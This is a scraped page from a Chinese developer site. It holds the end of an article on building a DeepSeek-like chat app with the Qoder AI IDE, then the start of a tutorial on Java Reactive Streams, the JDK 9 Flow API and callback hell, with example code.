<p>这个项目是使用 Qoder 开发一个类似 Deepseek 的 AI Chat 。打开“深度思考”模式。就会启用GLM-4.6的thinking功能，让AI进行充分的自我反思和优化。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/308fe16d50024167a3960a5e1309b613~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=uTsufOjq2F0jKaBY1t%2BHRhFkaks%3D" alt="" loading="lazy"/></p>
<p>分享一个和 AI 对话的小技巧：如果 AI 输出的结果你不满意，就问它一句：“你确定吗？”等它重新回答后，再追问一句：“你真的确定吗？”</p>
<p>通常经过这两轮自我反思，AI 就会给出明显更优的答案，大家可以试试看。</p>
<h3 data-id="heading-9">Qoder 高级特性</h3>
<p>接下来，我给大家分享下Qoder 的一些比较好的高级特性，能够显著提升开发效率：</p>
<ol>
<li>规则配置</li>
</ol>
<p>Qoder 支持为每个项目配置专属规则。规则存放于 <code>.qoder/rules</code> 目录中，仅对当前项目生效。规则可优化模型对你的编码偏好的适配，包括项目所用框架与代码风格。</p>
<p>使用 Qoder 时，建议不要先去编码，应该先配置规则，合理配置规则可以避免生成低质量代码，节省后续修改时间。</p>
<ol start="2">
<li>MCP配置</li>
</ol>
<p>MCP 通过标准化接口使 Qoder 智能体能够连接到各类外部系统和数据源，从而增强智能体的能力。</p>
<p>Qoder 支持 2 种配置 MCP 的方式：</p>
<ul>
<li>手动添加：将开源的 MCP 或者常用的企业服务封装为MCP，便于 Qoder 调用。</li>
<li>MCP 广场添加：Qoder 会在 MCP 广场预置了一些常用的 MCP，例如：Sequential Thinking、Figma 等，你可以一键安装。</li>
</ul>
<ol start="3">
<li>记忆系统</li>
</ol>
<p>Qoder 具备长期记忆能力。随着你持续使用，它会自动积累并更新你的个人偏好、项目上下文、踩过的坑和有效的解决方案，形成一套动态演进的记忆库，并在后续任务中智能调用——真正做到越用越懂你。</p>
<ol start="4">
<li>Repo Wiki</li>
</ol>
<p>Repo Wiki 能帮你快速梳理历史项目的整体逻辑，尤其对新成员非常友好。在开发过程中，无论是查询知识点、理解代码，还是新增功能，它都会深入分析项目结构与实现细节，结合代码库上下文，提供更准确、详尽的解答和文档支持，让 Qoder 真正“读懂”你的代码库。</p>
<p>这些高级功能的组合使用，使得 Qoder 不仅仅是一个代码生成工具，而是一个完整的智能开发环境。</p>
<h2 data-id="heading-10">04 未来之想：AI 时代，何以为人</h2>
<p>基于一年多的实践，我对未来有五点思考：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7105fa6431c45d19ba5a110c603e0b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5be05be0QUnnvJbnqIvnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608384&amp;x-signature=AKKkZ5W6yPIIYx%2Fo%2Bsrbse0mjzk%3D" alt="" loading="lazy"/></p>
<ol>
<li>能力重塑：开发者的核心能力从“会写代码”转向“会驾驭 AI”，提示工程成为新素养；</li>
<li>角色进化：从 Coder 变为 Creator，从执行者变为决策者，从独行侠变为“人机团队”的指挥官；</li>
<li>价值锚定：技术实现可外包给 AI，但判断力、责任感、创新、创意、同理心永远属于人；</li>
<li>终身学习：AI 进化速度远超人类，唯有保持好奇心和学习力才能不被淘汰；</li>
<li>保持人性：在效率至上的时代，守护人的温度——技术是手段，人的幸福才是目的。</li>
</ol>
<p>AI 不是取代人，而是放大人的能力，并将成本降低十倍。关键在于，你是否愿意拥抱这一变化，重新定义自己的角色与价值。</p>
<h2 data-id="heading-11">写在最后</h2>
<p>Vibe Coding不仅仅是一种新的编程技术，更是一种全新的思维方式和工作哲学。它要求我们重新思考人与技术的关系，重新定义开发者的角色和价值。</p>
<p>在这个人机协作的新时代，成功的关键不在于抗拒变化，而在于拥抱变化，在变化中找到自己的独特定位。</p>
<p>技术可以外包给AI，但判断、责任、创新、创意、同理心永远属于人。</p>
<p>让我们以开放的心态迎接这个新时代，在AI的助力下创造出更加美好的数字世界。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[响应式编程不只有概念！万字长文 + 代码示例，手把手带你玩转 RxJava]]></title>    <link>https://juejin.cn/post/7588095884070273024</link>    <guid>https://juejin.cn/post/7588095884070273024</guid>    <pubDate>2025-12-28T01:07:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588095884070273024" data-draft-id="7588093282530770996" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="响应式编程不只有概念！万字长文 + 代码示例，手把手带你玩转 RxJava"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-28T01:07:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java随想录"/> <meta itemprop="url" content="https://juejin.cn/user/2837192913204935"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            响应式编程不只有概念！万字长文 + 代码示例，手把手带你玩转 RxJava
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2837192913204935/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java随想录
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T01:07:20.000Z" title="Sun Dec 28 2025 01:07:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读29分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文已收录至GitHub，推荐阅读 👉 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FBookSea4j%2FJavaRecord" target="_blank" title="https://github.com/BookSea4j/JavaRecord" ref="nofollow noopener noreferrer">Java随想录</a></p>
<p>微信公众号：Java随想录</p>
<h2 data-id="heading-0">Reactive Streams 介绍</h2>
<p>在聊 Reactive Streams 之前，先了解一下 Reactive Programming（反应式/响应式编程）。为了解决异步编程中出现的各种问题，程序员们提出了各种的思路去解决这些问题，这些解决问题的方式、方法，手段就可以叫做 Reactive Programming。</p>
<p>Reactive Programming 是一种编程思想，类似面向对象，函数式编程。</p>
<p>本质上是对数据流或某种变化做出的反应，这个变化什么时候触发是未知的，所以他是一种基于异步、回调的方式在处理问题。</p>
<p>当越来越多的程序员，开始使用这种编程思想时，需要一些大佬来统一一个思想规范。所以国外的几个大佬公司启动了 Reactive Streams 项目。Netflix、Pivotal、Lightbend 联合来为异步流处理提供标准，规范。</p>
<p>Reactive Streams 翻译过来就是响应式/反应式流。<strong>其实是一种基于异步流处理的标准化规范，目的是在使用流处理时更加可靠，高效和响应式。</strong></p>
<h2 data-id="heading-1">Java 层面的 Reactive Streams</h2>
<p>基于这个规范的实现很多，比如三方库中比较出名的 RxJava，Reactor 等等。</p>
<p>但是 JDK8 版本中，Java 已经有了 CompletableFuture 的支撑，我们可以将大量的异步任务做好编排。但是在 JDK8 版本中的 CompletableFuture 依然有很多特性无法支撑。所以在 JDK9，CompletableFuture 做了很多的更新，比如支持延迟，超时，子类化之类的功能。</p>
<p>这时，咱们会发现，其实 CompletableFuture 已经可以去支撑做一些异步编程的操作了。但是为什么很多大公司依然还是使用 RxJava，Reactor 这种三方依赖库呢？</p>
<p>问题在于，大多数的时候，咱们采用异步编程处理的任务并不是非常复杂的。这个时候，咱们确实不需要去使用 Reactive Streams 反应流的框架。如果系统越来越复杂，或者你处理的业务本身就是及其复杂的那种，你就要去写一个让人头皮发麻的代码了。随着时间的推移，这种代码会变成非常难以维护。</p>
<p>其次 CompletableFuture 并不是真正的基于 Reactive Streams 去实现。CompletableFuture 描述的是单次执行的结果。尽管可以通过各种方法将异步任务之间构建成一串任务组成的流程图，本质上依然是单次的结果。</p>
<p>反应式流，面向的是 Stream。 咱们 Java 中的 Stream API 更类似 Reactive Streams 的思想。Stream API 是同步阻塞的。</p>
<p>最经典的就是 CompletableFuture 无法处理 Reactive Streams 中的一个核心概念，Back Pressure（背压，反压，回压），比如在上下游承载能力不同时，比如下游玩不转了，需要告知上游采取一些策略去解决。CompletableFuture 明显无法处理这种。</p>
<p>其次还有 Java 中提供的回调，Future 机制在实现响应式编程中，问题和缺点都比较难处理。有个比较出名的概念叫做 Callback Hell（回调地狱）。简单来说就是回调里面套回调，虽然将子过程做到解耦，但是随着业务的负责，回调代码的可读性、复杂性就大大的增加，这个就是回调地狱。</p>
<p>所以，咱们需要一套框架或者说类库来实现真正响应式流，大概需要几个特性：</p>
<ul>
<li>支持将异步任务做封装以及组装，需要 API 对异步任务进行包装，并且需要很多子任务来对异步操作进行链式组装，过程中包括过滤，异常处理，超时等等操作。</li>
<li>减少异步任务的嵌套，减少代码的复杂性，增加可读性，避免 Callback Hell 这种及其复杂恶心的代码。</li>
<li>支持背压 Back Pressure，也就需要有上游和下游的概念，可以做到协商处理数据流的速度。</li>
</ul>
<h2 data-id="heading-2">Java 层面 Reactive Steams 的 API</h2>
<p>首先 Reactive Steams 响应流实现方式其实是基于观察者模式的扩展，同时也能看到发布订阅模式，责任链模式等等。</p>
<p>整个 Reactive Steams 流程大致如下。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9592c871e5e40f1be90efcf888187cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=TSgTt3xeOZBxptm6EuAjG8vQSSg%3D" alt="" loading="lazy"/></p>
<p>直接在 JDK9 版本之上查看 Doug Lee 提供的 Flow 类。</p>
<p>在 Flow 类中，提供了核心的四个接口：Publisher，Subscriber，Subscription，Processor</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09f5138c2bb440098f904bb47b27b6ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=7316XjMXvFoj2HFpvI5fx5Tv08I%3D" alt="" loading="lazy"/></p>
<p>Publisher：Publisher 是函数式接口，负责发布数据的。 Publisher 内部有一个方法 subscribe 方法，去和具体的订阅者绑定关系。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bd5da1cce0a48768a6c10bd3325c266~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=0yFzU%2FEhU6cf%2FLDc%2FhYGO%2FgDKY8%3D" alt="" loading="lazy"/></p>
<p>Subscriber：Subscriber 是订阅者，负责订阅，消费数据。四个方法：</p>
<ul>
<li>onSubscribe：订阅成功后触发，并且表明可以开始接收发布者的数据元素了。</li>
<li>onNext：每次获取到发布者的数据元素都会执行 onNext。</li>
<li>onError：接收数据元素时，出现异常等问题时，走 onError。</li>
<li>onComplete：当指定接收的元素个数搞定后，触发 onComplete。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b00cfd018c9e4d6d9eab9109a953eac6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=KN1vhpT34Ny2FvK3c39OX73WOuI%3D" alt="" loading="lazy"/></p>
<p>Subscription：发布者和订阅者是基于 Subscription 关联的。当建立了订阅的关系后，发布者会将 Subscription 传递给订阅者。订阅者指定获取元素的数量和取消订阅操作，都要基于 Subscription 去操作。提供了两个方法：</p>
<ul>
<li>request：订阅者要获取的元素个数。</li>
<li>cancel：取消订阅，当前的订阅者不接收当前发布者的元素。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c68ad044b9374c3eab14b2f3b49f13c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=Jpp0h1Y6ZxFtnBsdj86KdC4YnpI%3D" alt="" loading="lazy"/></p>
<p>Processor：Processor 继承了 Publisher 和 Subscriber，即是发布者也是订阅者。Processor 一般作为数据的中转，订阅者处理完数据元素，可以再次发给下一个订阅者。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a42047a535c9423995491f68ce606ee3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yemaj-aDs-W9lQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767488840&amp;x-signature=xtE0ChJLm8qslq46IFzHStHC4YA%3D" alt="" loading="lazy"/></p>
<p>这四个接口很重要，是 Reactive Streams 的规范，但是可以明显的看到，内部没有具体的内容实现。</p>
<p>这里就类似 JDBC 这种规范，规范在 JDK9 中提出来了，想实现，可以基于当前的这四个接口再做具体的逻辑处理以及实现的细节。</p>
<h2 data-id="heading-3">Java 层面 Reactive Steams 基本操作</h2>
<p>咱们测试 Java 中的 Flow 里提供的 API 时，就是走最基本的操作。</p>
<p>其中 Processor 不需要重写，玩最基本的操作，不去做订阅者和发布者的转换。</p>
<p>其次 Subscription 也不需要重写，这东西就是提供了订阅者指定订阅的消息个数，以及取消的操作。</p>
<p>然后 Publisher 需要重写，但是 JDK 中已经提供了一个 Publisher 的实现，SubmissionPublisher，可以直接使用。</p>
<p>最后，Subscriber 需要咱们自己重写，指定好订阅消息的个数，已经消费的一些逻辑</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.Flow;


<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySubscriber</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Flow</span>.Subscriber&lt;Integer&gt; {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-comment">// 绑定好订阅关系后，就会触发这个方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSubscribe</span><span class="hljs-params">(Flow.Subscription subscription)</span> {
        subscription.request(<span class="hljs-number">10</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNext</span><span class="hljs-params">(Integer item)</span> {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"：接收到数据流："</span> + item);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span> {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"：接收消息出现异常："</span> + throwable.getMessage());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onComplete</span><span class="hljs-params">()</span> {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"：当前订阅者要求接收的消息全部处理完毕。"</span>);
    }
}
</code></pre>
<p>直接使用 SubmissionPublisher 测试整体效果</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
    <span class="hljs-comment">// 只有一个工作线程的线程池</span>
    <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">1</span>);
    <span class="hljs-comment">// 指定缓冲区的大小</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">maxBufferCapacity</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;

    <span class="hljs-comment">// 需要指定两个参数</span>
    <span class="hljs-comment">// 第一个参数需要传递一个线程池，指定订阅者使用的线程</span>
    <span class="hljs-comment">// 第二个参数，需要指定一个缓冲区，发布者发布消息后，消息会扔到缓冲区里。</span>
    SubmissionPublisher&lt;Integer&gt; publisher = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubmissionPublisher</span>&lt;&gt;(executor,maxBufferCapacity);

    <span class="hljs-comment">// 绑定订阅者</span>
    <span class="hljs-type">MySubscriber</span> <span class="hljs-variable">subscriber</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySubscriber</span>();
    publisher.subscribe(subscriber);

    <span class="hljs-comment">// 发布消息</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">"：发布消息："</span> + i);
        publisher.submit(i);
    }

    <span class="hljs-comment">// 释放资源</span>
    publisher.close();
    executor.shutdown();
}
</code></pre>
<p>结果输出如下：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">0</span>
<span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">1</span>
<span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">2</span>
<span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">3</span>
<span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">4</span>
<span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">5</span>
<span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">6</span>
<span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">7</span>
<span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">8</span>
<span class="hljs-selector-tag">main</span>：发布消息：<span class="hljs-number">9</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">0</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">1</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">2</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">3</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">4</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">5</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">6</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">7</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">8</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：接收到数据流：<span class="hljs-number">9</span>
pool-<span class="hljs-number">1</span>-thread-<span class="hljs-number">1</span>：当前订阅者要求接收的消息全部处理完毕。
</code></pre>
<ul>
<li><strong>缓冲区：</strong> 缓冲区就是发布者和订阅者之间的一块内存，类似线程池中的阻塞队列，可以将消息扔到这个缓存区里。其次咱们设置的缓冲区大小是 5，但是发现 get 出来的时候，5 被替换为了 8。这是因为 SubmissionPublisher 为了更有效的使用内存，默认会基于 roundCapacity 方法将传递的缓冲区大小替换为 2 的 n 次幂。</li>
<li><strong>背压效果：</strong> 当订阅者指定的消息已经全部处理完毕后，发布者最多只能发布缓冲区大小个数的消息，剩下的内容会基于背压的效果直接暂时不发送。</li>
<li><strong>onComplete：</strong> 需要发布者做了close 操作，确认了发布者已经将消息全部发送，并且订阅者也已经将全部的消息处理完毕后，才会触发 onComplete。</li>
<li><strong>Subscription：</strong> 订阅者可以在 onNext 或者其他方法中动态的使用 subscription 去指定后续需要几个消息订阅，以及是否需要取消订阅消息等操作。</li>
</ul>
<h2 data-id="heading-4">Reactive Steams 落地体验</h2>
<h3 data-id="heading-5">回调地狱问题</h3>
<p>前面的方式大致了解了 JDK9 中更新的 Reactive Streams 的规范，咱们实现也仅仅是看到了发布订阅和回压的效果。并没有看到如何解决回调地狱的问题。咱们可以通过 Spring5 官网提供的一个例子，来体验一下 CallBack Hell 回调地狱带来的问题。后面再根据三方的实现来看一下基于 Reactive Streams 实现后效果如何。这里基本是根据伪代码走的。</p>
<p>例子：在用户的 UI 页面上，展示当前用户最喜欢的 Top5 的商品详情。这里会根据用户的 ID 去查询当前用户 Top5 商品的ID，如果 ID 可以查询到之后再根据商品的 ID 去查询商品的详情。如果当前用户 ID 查询的结果不存在喜欢的 Top 商品，没有的话，通过推荐服务查询 Top5 的商品信息。展示给用户。</p>
<p>当前例子需要三个服务的支撑：</p>
<ul>
<li>根据用户 ID 查询用户的 Top5 商品ID。</li>
<li>根据 Top5 商品ID查询商品详情。</li>
<li>调用推荐服务，获取5个商品详情。</li>
</ul>
<p>基于 Java 最原生的异步编程方式，实现上述操作，来看看到底什么是回调地狱。。。</p>
<p>商品详情实体类：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fav</span> {

    <span class="hljs-keyword">private</span> String itemId;

    <span class="hljs-keyword">private</span> String itemName;

    <span class="hljs-keyword">private</span> String itemDetail;

}
</code></pre>
<p>准备回调方法，拿到结果后触发</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Callback</span>&lt;T&gt; {

    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(T t)</span>;

    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span>;

}
</code></pre>
<p>准备了访问三个服务的 Service 接口</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-comment">/**
     * 根据用户Id查询用户的Top5商品Id
     * <span class="hljs-doctag">@param</span> userId
     * <span class="hljs-doctag">@param</span> list
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getFav</span><span class="hljs-params">(String userId, Callback&lt;List&lt;String&gt;&gt; list)</span>;

}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ItemService</span> {
    
    <span class="hljs-comment">/**
     * 根据商品Id查询商品的详情
     *
     * <span class="hljs-doctag">@param</span> itemId
     * <span class="hljs-doctag">@param</span> callback
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDetail</span><span class="hljs-params">(String itemId, Callback&lt;Fav&gt; callback)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SuggestionService</span> {

    <span class="hljs-comment">/**
     * 调用推荐服务，获取推荐商品
     * <span class="hljs-doctag">@param</span> favs
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getSuggestion</span><span class="hljs-params">(Callback&lt;List&lt;Fav&gt;&gt; favs)</span>;
}
</code></pre>
<p>准备了响应数据的 UI 线程工具以及响应方法</p>
